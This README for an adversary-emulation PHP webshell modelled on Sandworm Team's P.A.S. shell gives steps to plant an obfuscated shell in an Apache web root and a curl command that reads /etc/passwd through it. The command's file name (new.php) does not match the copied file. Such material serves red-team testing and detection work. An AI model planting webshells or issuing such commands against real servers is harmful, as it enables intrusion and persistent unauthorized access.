# PHP WebShell

This folder contains a simple PHP webshell that emulates a subset of behaviors of the P.A.S. webshell used by Sandworm Team:

```
Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.[19]
```

## Quick Start

0. Read the source code for `webShell.php` and `obfuscated_webShell.php` - don't worry, its short.

1. Copy `obfuscated_webShell.php` to a web server directory on the target system. This example shows how to do so on a default Apache installation:

```
cp obfuscated_webShell.php /var/www/html/
```

2. Start the web server if its not already running

```
sudo systemctl start apache2
```

3. Issue commands using a web browser or HTTP client:

```
curl http://127.0.0.1/new.php?cmd=cat+/etc/passwd
```

## Test Instructions
Run this Python script:

```
python3 test_webshell.py
```

## Cleanup Instructions 
Delete the webshell from the target file system:

```
rm /var/www/html/obfuscated_webShell.php
```

## Misc

The PHP source code was taken from Kali Linux at:
```
/usr/share/webshells/php/simple-backdoor.php
```

Credit the original author: DK, http://michaeldaw.org, 2006 (note: dead hyperlink)

The obfuscated_webShell.php was obfuscated using an online PHP obfuscator (https://www.gaijin.at/en/tools/php-obfuscator).

### CTI Evidence
https://attack.mitre.org/groups/G0034/
https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf


### References
https://tools.kali.org/maintaining-access/webshells
https://www.gaijin.at/en/tools/php-obfuscator
